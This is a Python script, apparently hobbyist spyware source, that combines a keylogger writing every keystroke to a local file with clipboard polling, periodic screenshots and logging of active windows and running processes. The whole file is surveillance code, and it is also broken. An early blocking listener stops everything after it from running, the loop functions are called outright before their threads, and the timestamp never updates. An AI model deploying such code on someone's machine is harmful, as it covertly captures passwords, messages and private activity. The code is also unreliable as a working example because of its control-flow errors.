from pynput import keyboard
from datetime import datetime
import pyperclip
import time
from PIL import ImageGrab
import os
import psutil
import pygetwindow as gw
import threading


timestamp = datetime.now().isoformat()
# This function runs every time a key is pressed
def on_press(key):
    try:
        # Get the normal character pressed
        key_data = key.char
    except AttributeError:
        # Handle special keys (like Space, Enter, Shift)
        key_data = f" [{key}] "

    # Write the key to a local log file
    with open("log.txt", "a", encoding="utf-8") as f:
        f.write(f"{timestamp} | {key_data}\n")

# Start listening to the keyboard
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()


def log_clipboard():

    recent_value = ""

    while True:

        time.sleep(5)

        current_value = pyperclip.paste()

        if current_value != recent_value:

            recent_value = current_value

            print(f'Clipboard content: {recent_value}')

log_clipboard()

def capture_screen():

    while True:

        time.sleep(60)

        screenshot = ImageGrab.grab()

        screenshot.save(os.path.join("screenshots", f"screenshot_{int(time.time())}.png"))

capture_screen()

def track_activity():

    previous_window = None

    while True:

        time.sleep(5)

        current_window = gw.getActiveWindowTitle()

        if current_window != previous_window:

            previous_window = current_window

            print(f'Active window: {current_window}')

        for proc in psutil.process_iter(['pid', 'name']):

            print(f'Running process: {proc.info["name"]} (PID: {proc.info["pid"]})')

track_activity()


# Start keylogger

listener = keyboard.Listener(on_press=on_press)

listener.start()

# Start clipboard logger

clipboard_thread = threading.Thread(target=log_clipboard)

clipboard_thread.start()

# Start screen capture

screen_thread = threading.Thread(target=capture_screen)

screen_thread.start()

# Start activity tracker

activity_thread = threading.Thread(target=track_activity)

activity_thread.start()

listener.join()

clipboard_thread.join()

screen_thread.join()

activity_thread.join()


